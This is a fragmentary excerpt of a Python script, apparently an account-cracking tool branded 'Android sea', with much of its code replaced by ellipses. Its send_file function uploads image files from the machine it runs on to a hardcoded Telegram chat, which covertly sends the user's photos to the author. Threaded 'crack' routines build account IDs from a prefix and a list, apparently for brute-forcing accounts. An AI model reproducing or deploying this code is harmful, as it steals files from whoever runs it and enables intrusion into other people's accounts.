...
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id='5734274700', photo=f, caption='By: Android sea 🖤@bavAhba')
...
╠══[name                        • \33[1;38mAndroid sea 🖤]   ║\33[1;34m   
╠══[Yuzri                     • ]   @bavAhba       ║ \33[1;32m   
                ...
                if "server on" in sj:
                        ...
                        if xd in ['1','01']:                           
                                ...
                                with tred(max_workers=30) as crack_submit:
                                        ...
                                        print("\033[1;32m Run by Android sea 🖤")
...
def pak():
                ...
                with tred(max_workers=30) as ASX:     
                        ...
                        print(f'\033[1;32m تم تشغيل بواسطه Android sea 🖤')
                        linex()
                        for psx in user:
                                ids = code+psx
...
def bd():
                ...
                with tred(max_workers=30) as ASX:
                        ...
                        print(' \033[1;32m تم تشغيل بواسطه Android sea 🖤')
